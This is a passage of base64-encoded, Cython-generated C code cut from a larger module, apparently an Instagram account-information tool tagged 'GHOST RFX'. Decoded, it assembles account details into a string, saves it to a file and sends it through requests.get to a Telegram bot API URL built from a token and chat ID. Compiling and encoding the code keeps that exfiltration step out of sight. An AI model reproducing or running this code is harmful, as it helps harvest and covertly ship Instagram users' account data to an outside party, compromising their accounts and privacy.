gIF9fcHl4X3RfMThbMjBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9JbnN0YWdyYW1faHR0cHNfd3d3X2luc3RhZ3JhbV9jO1xuICBfX3B5eF90XzE4WzIxXSA9IF9fcHl4X3RfMTc7XG4gIF9fcHl4X3RfMThbMjJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9HSE9TVF9SRlg7XG4gIF9fcHl4X3RfMTkgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzE4LCAyMywgNTMgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEpICsgMTEgKiAyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8zKSArIDIxICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF80KSArIDE1ICogMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzExKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTIpICsgOSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTMpICsgMTIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE0KSArIDEwICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xNSkgKyAxNCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTYpICsgNDEgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE3KSArIDQ0LCAxMTE0MTExIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8zKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzQpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNykpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMjU0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcbiAgX19weXhfdl9zcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTkpO1xuICBfX3B5eF90XzE5ID0gMDtcblxuICBcbiAgIHtcbiAgICBfX3B5eF90XzE5ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMjcxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbmNvZGluZywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91dGZfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fcHl4X3RfMTcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdLCBfX3B5eF90XzE5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzE3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgX19weXhfdF8xNiA9IE5VTEw7XG4gICAgX19weXhfdF8xNSA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE1KSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDE3X2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE1KTtcbiAgICBfX3B5eF90XzUgPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTUpKSkge1xuICAgICAgX19weXhfdF8xNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTUpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMTYpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE1KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE2KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE1LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF81ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTYsIE5VTEx9O1xuICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMjcxLCBfX3B5eF9MMTdfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgfVxuICAgIF9fcHl4X3RfMTUgPSBfX3B5eF90XzE5O1xuICAgIF9fcHl4X3RfMTkgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfNiwgJl9fcHl4X3RfMjApO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIwKTtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX3B5eF92X2ZpbGUgPSBfX3B5eF90XzE1O1xuICAgICAgICAgIF9fcHl4X3RfMTUgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xNyA9IF9fcHl4X3ZfZmlsZTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfdl9zcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAyNzIsIF9fcHl4X0wyMV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xNywgX19weXhfdF8xOX07XG4gICAgICAgICAgICBfX3B5eF90XzE1ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dyaXRlLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNSkpIF9fUFlYX0VSUigwLCAyNzIsIF9fcHl4X0wyMV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMjZfdHJ5X2VuZDtcbiAgICAgICAgX19weXhfTDIxX2Vycm9yOjtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICB7XG4gICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC5JbmZvQWNjIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xNSwgJl9fcHl4X3RfMTksICZfX3B5eF90XzE3KSA8IDApIF9fUFlYX0VSUigwLCAyNzEsIF9fcHl4X0wyM19leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19weXhfdF8xNiA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzE1LCBfX3B5eF90XzE5LCBfX3B5eF90XzE3KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDIzX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF84LCBfX3B5eF90XzE2LCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAyNzEsIF9fcHl4X0wyM19leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzIxKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgICAgICAgIGlmIChfX3B5eF90XzkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNzEsIF9fcHl4X0wyM19leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19weXhfdF8xMCA9ICghX19weXhfdF85KTtcbiAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8xMCkpIHtcbiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMTUsIF9fcHl4X3RfMTksIF9fcHl4X3RfMTcpO1xuICAgICAgICAgICAgX19weXhfdF8xNSA9IDA7ICBfX3B5eF90XzE5ID0gMDsgIF9fcHl4X3RfMTcgPSAwOyBcbiAgICAgICAgICAgIF9fUFlYX0VSUigwLCAyNzEsIF9fcHl4X0wyM19leGNlcHRfZXJyb3IpXG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDIyX2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0wyM19leGNlcHRfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIwKTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzYsIF9fcHl4X3RfMjApO1xuICAgICAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgICAgICBfX3B5eF9MMjJfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIwKTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzYsIF9fcHl4X3RfMjApO1xuICAgICAgICBfX3B5eF9MMjZfdHJ5X2VuZDo7XG4gICAgICB9XG4gICAgfVxuICAgICB7XG4gICAgICB7XG4gICAgICAgIGlmIChfX3B5eF90XzgpIHtcbiAgICAgICAgICBfX3B5eF90XzIwID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdLCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjApKSBfX1BZWF9FUlIoMCwgMjcxLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIF9fcHl4X0wyMDtcbiAgICAgIH1cbiAgICAgIF9fcHl4X0wyMDo7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDMwO1xuICAgIF9fcHl4X0wxN19lcnJvcjo7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MMzA6O1xuICB9XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfMjAsICZfX3B5eF90XzYpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjApO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfMjEsICZfX3B5eF90XzIyKTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjIpO1xuICAgICAgICAge1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xOSA9IE5VTEw7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE1LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTUpKSBfX1BZWF9FUlIoMCwgMjc1LCBfX3B5eF9MMzdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMjc1LCBfX3B5eF9MMzdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Ub2tlbik7IGlmICh1bmxpa2VseSghX19weXhfdF8xNSkpIF9fUFlYX0VSUigwLCAyNzYsIF9fcHl4X0wzN19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzE1LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDI3NiwgX19weXhfTDM3X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0lEKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE1KSkgX19QWVhfRVJSKDAsIDI3NiwgX19weXhfTDM3X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMjc2LCBfX3B5eF9MMzdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgICAgX19weXhfdF8yM1swXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYXBpX3RlbGVncmFtX29yZ19ib3Q7XG4gICAgICAgICAgX19weXhfdF8yM1sxXSA9IF9fcHl4X3RfMTQ7XG4gICAgICAgICAgX19weXhfdF8yM1syXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VuZE1lc3NhZ2VfY2hhdF9pZDtcbiAgICAgICAgICBfX3B5eF90XzIzWzNdID0gX19weXhfdF8xMztcbiAgICAgICAgICBfX3B5eF90XzIzWzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV90ZXh0XzI7XG4gICAgICAgICAgX19weXhfdF8yM1s1XSA9IF9fcHl4X3Zfc3M7XG4gICAgICAgICAgX19weXhfdF8xNSA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMjMsIDYsIDI4ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xNCkgKyAyMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTMpICsgNiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3Zfc3MpLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdl9zcykpO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNSkpIF9fUFlYX0VSUigwLCAyNzYsIF9fcHl4X0wzN19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDE7XG4gICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzE2KSkpIHtcbiAgICAgICAgICAgIF9fcHl4X3RfMTkgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzE5KTtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNik7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzE5LCBfX3B5eF90XzE1fTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzE2LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSg